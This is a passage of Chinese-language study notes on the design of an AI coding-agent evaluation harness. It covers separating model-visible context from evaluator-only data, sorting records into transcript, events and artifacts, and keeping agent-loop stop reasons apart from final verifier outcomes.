Implemented a production-grade secure Docker sandbox.
```

更准确的是：

```text
Designed Docker-based executable repository environment support and implemented local process mode for the first runnable prototype.
```

这个区分能避免把设计能力、计划能力和已经交付的运行时能力混在一起。

---

## 读 00-12 时可以反复对照的三个问题

### 问题一：这个对象是给模型看的，还是给评测器看的？

例如：

- issue statement 通常模型可见。
- hidden tests、gold patch、reward metadata 默认不可见。
- feedback verifier 由 `run_tests` 触发时可以作为 tool result 摘要给模型看。
- baseline verifier 和 formal final verifier 默认不进入后续模型上下文。

只要你读到某个字段，就问它属于 `agent_visible_context` 还是 `evaluator_only_metadata`。

### 问题二：这个结果是 transcript 事实，还是 event 事实，还是 artifact 事实？

例如：

- 模型说了什么、工具观察是什么，进入 transcript。
- 工具耗时、权限决策、exit code、error type，进入 events。
- 完整 stdout、原始模型响应、大文件内容、final diff，进入 artifacts。

同一事实可以互相引用，但不要把所有东西都塞进 transcript。

### 问题三：这个结论来自 agent loop，还是来自 final verifier？

例如：

- `feedback_tests_passed` 是 agent loop 停止原因。
- `accepted` 是 final verifier 的验证结论。
- `success` 是 Eval Runner 根据确定性规则派生的 run outcome。

不要用一个 `termination_reason` 混掉三层含义。这个区分会贯穿评测指标、reward metadata、训练导出和面试叙述。
